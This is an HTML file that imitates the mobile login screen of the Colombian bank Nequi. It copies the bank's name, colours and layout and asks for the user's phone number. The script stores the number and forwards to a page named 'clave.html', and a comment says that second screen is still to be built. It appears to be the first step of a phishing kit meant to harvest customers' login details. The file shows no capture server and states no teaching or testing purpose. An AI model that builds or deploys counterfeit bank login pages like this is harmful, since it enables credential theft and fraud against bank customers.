<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nequi</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #2C0B3A;
      font-family: 'Roboto', sans-serif;
      height: 100vh;
      color: white;
      overflow: hidden;
    }
    .container {
      max-width: 420px;
      margin: 0 auto;
      height: 100vh;
      position: relative;
      background: linear-gradient(to bottom, #2C0B3A, #1F0829);
    }

    .help {
      position: absolute;
      top: 20px;
      right: 20px;
      width: 28px;
      height: 28px;
      border: 2px solid white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      color: white;
    }

    .logo {
      position: absolute;
      top: 120px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 58px;
      font-weight: 700;
      color: white;
    }
    .logo-dot {
      color: #FF2D95;
    }

    .input-box {
      position: absolute;
      top: 280px;
      left: 30px;
      right: 30px;
      background: #3A1C4A;
      border-radius: 8px;
      padding: 4px;
    }

    .input-inner {
      background: #2C0B3A;
      border-radius: 6px;
      display: flex;
      align-items: center;
      padding: 0 10px;
    }

    .country {
      color: #FF69B4;
      font-weight: 500;
      padding-right: 12px;
      border-right: 2px solid #6B2B7A;
    }

    input {
      flex: 1;
      background: transparent;
      border: none;
      color: white;
      font-size: 17px;
      padding: 16px 14px;
      outline: none;
    }

    input::placeholder {
      color: #B38BC9;
    }

    /* Fix para autocompletado */
    input:-webkit-autofill,
    input:-webkit-autofill:hover,
    input:-webkit-autofill:focus {
      -webkit-text-fill-color: white !important;
      -webkit-box-shadow: 0 0 0 30px #2C0B3A inset !important;
    }

    button {
      position: absolute;
      bottom: 80px;
      left: 30px;
      right: 30px;
      background: linear-gradient(to right, #FF2D95, #E6007E);
      color: white;
      border: none;
      height: 56px;
      border-radius: 8px;
      font-size: 17px;
      font-weight: 500;
      box-shadow: 0 4px 12px rgba(255, 45, 149, 0.3);
    }
  </style>
</head>
<body>

  <div class="container" id="screen1">
    <div class="help">?</div>
    
    <div class="logo">
      <span class="logo-dot">■</span> Nequi
    </div>

    <div class="input-box">
      <div class="input-inner">
        <div class="country">+57</div>
        <input type="tel" id="phone" placeholder="Ingresa tu cel" maxlength="10" inputmode="numeric" required>
      </div>
    </div>

    <button onclick="nextScreen()">Entra</button>
  </div>

  <script>
    function nextScreen() {
      const phone = document.getElementById("phone").value.trim();
      if (phone.length < 10) {
        alert("Por favor ingresa un número de celular válido");
        return;
      }
      localStorage.setItem("phone", phone);
      window.location.href = "clave.html";   // Vamos a crear la segunda pantalla ahora
    }
  </script>
</body>
</html>
